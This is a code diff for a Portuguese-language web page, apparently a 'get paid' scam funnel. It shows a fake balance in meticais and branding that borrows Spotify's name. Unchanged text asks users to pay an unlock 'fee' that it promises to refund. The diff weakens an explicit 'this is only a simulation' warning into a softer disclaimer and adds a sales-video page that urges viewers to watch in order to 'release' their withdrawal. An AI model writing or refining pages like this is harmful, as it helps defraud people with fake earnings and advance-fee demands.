@@ -14,7 +14,7 @@
             margin: 0;
             padding: 0;
             font-family: Arial, sans-serif;
-            padding-top: 60px;
+            padding-top: 75px;
         }
 
         /* Alerta de simulacao fixo */
@@ -26,9 +26,10 @@
             background-color: #ff9800;
             color: #fff;
             text-align: center;
-            padding: 15px 10px;
-            font-weight: bold;
-            font-size: 14px;
+            padding: 12px 15px;
+            font-weight: normal;
+            font-size: 13px;
+            line-height: 1.5;
             z-index: 10001;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
         }
@@ -36,7 +37,7 @@
         /* Menu de cima */
         .menu {
             position: fixed;
-            top: 60px;
+            top: 75px;
             width: 100%;
             height: 70px;
             background: linear-gradient(180deg, #f0f4f8, #fff);
@@ -927,13 +928,90 @@
             border-color: #4ade80;
             box-shadow: 0 0 10px rgba(74, 222, 128, 0.6);
         }
+
+        /* Estilos para a página de vídeo */
+        .video-page {
+            background-color: #fff;
+            min-height: 100vh;
+            padding-top: 75px;
+        }
+
+        .video-header {
+            background-color: #06B32E;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            line-height: 1.4;
+        }
+
+        .saldo-display {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .saldo-display img {
+            width: 100px;
+        }
+
+        .saldo-box {
+            border: 2px solid #06B32E;
+            border-radius: 10px;
+            padding: 10px 20px;
+            text-align: center;
+        }
+
+        .saldo-label {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .saldo-valor {
+            font-size: 18px;
+            font-weight: bold;
+            color: #06B32E;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        .video-section {
+            padding: 20px;
+        }
+
+        .video-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #06B32E;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .video-subtitle {
+            font-size: 16px;
+            color: #333;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .video-container {
+            width: 100%;
+            margin: 0 auto;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
     </style>
 </head>
 <body>
 
 <!-- Alerta de Simulacao -->
 <div class="simulation-alert">
-    ATENCAO: Isto e apenas uma simulacao. Nao sao ganhos reais!
+    ⚠️ Nota Importante: Os valores apresentados são meramente ilustrativos e não representam ganhos reais. Esta é apenas uma demonstração.
 </div>
 
 <!-- Audio -->
@@ -1498,7 +1576,7 @@
             Fique tranquilo, voce recebera o valor da taxa de volta junto ao valor do seu levantamento, e apenas uma etapa de validamento de que voce seria um humano e nao um robo.
         </p>
         <div style="margin-bottom: 20px;"></div>
-        <button class="desbloquear-button" style="font-weight: bold;" onclick="alert('Sistema em desenvolvimento')">
+        <button class="desbloquear-button" style="font-weight: bold;" onclick="mostrarPagina('video')">
             DESBLOQUEAR AGORA
         </button>
     </div>
@@ -1573,12 +1651,46 @@
     </div>
 </div>
 
+<!-- Pagina Video -->
+<div id="video" class="video-page" style="display: none;">
+    <div class="video-header">
+        ASSISTA O VÍDEO ABAIXO PARA LIBERAR SEU SAQUE E ACESSO VITALÍCIO.
+    </div>
+
+    <div class="saldo-display">
+        <img src="images/opinilogo.png" alt="Spotify Logo">
+        <div class="saldo-box">
+            <div class="saldo-label">SALDO</div>
+            <div class="saldo-valor" id="valor-video">9,100.00 MT</div>
+        </div>
+    </div>
+
+    <div class="video-section">
+        <h2 class="video-title">DESBLOQUEIO DE SALDO</h2>
+        <p class="video-subtitle">
+            Veja como liberar seu saque assistindo ao vídeo.
+        </p>
+
+        <div class="video-container">
+            <vturb-smartplayer id="vid-68958b0694176522ab1b6032" style="display: block; margin: 0 auto; width: 100%;"></vturb-smartplayer>
+        </div>
+    </div>
+</div>
+
 <!-- JavaScript -->
+<script type="text/javascript">
+    var s=document.createElement("script");
+    s.src="https://scripts.converteai.net/9d93e4b2-3654-4bea-bda0-107c1328d520/players/68958b0694176522ab1b6032/v4/player.js",
+    s.async=!0,
+    document.head.appendChild(s);
+</script>
+
 <script>
     const inicioDiv = document.getElementById('inicio');
     const saqueDiv = document.getElementById('saque');
     const loginDiv = document.getElementById('login');
     const bonusDiv = document.getElementById('bonus');
+    const videoDiv = document.getElementById('video');
 
     function playAudio() {
         var audio = document.getElementById("meuAudio");
@@ -1612,11 +1724,13 @@
     const valorSpan = document.getElementById('valor');
     const valorSpanSaque = document.getElementById('valor-saque');
     const valorSpanMoney = document.getElementById('valor-money');
+    const valorSpanVideo = document.getElementById('valor-video');
 
     function atualizarValor() {
         valorSpan.textContent = `${valor.toFixed(2)} MT`;
         valorSpanSaque.textContent = `${valor.toFixed(2)} MT`;
         valorSpanMoney.textContent = `${valor.toFixed(2)} MT`;
+        valorSpanVideo.textContent = `${valor.toFixed(2)} MT`;
         setCookie('valor', valor.toFixed(2), 365);
     }
 
@@ -1638,6 +1752,7 @@
         saqueDiv.style.display = pagina === 'saque' ? 'block' : 'none';
         loginDiv.style.display = pagina === 'login' ? 'block' : 'none';
         bonusDiv.style.display = pagina === 'bonus' ? 'block' : 'none';
+        videoDiv.style.display = pagina === 'video' ? 'block' : 'none';
     }
 
     function trocarDiv(esconderId, mostrarId) {
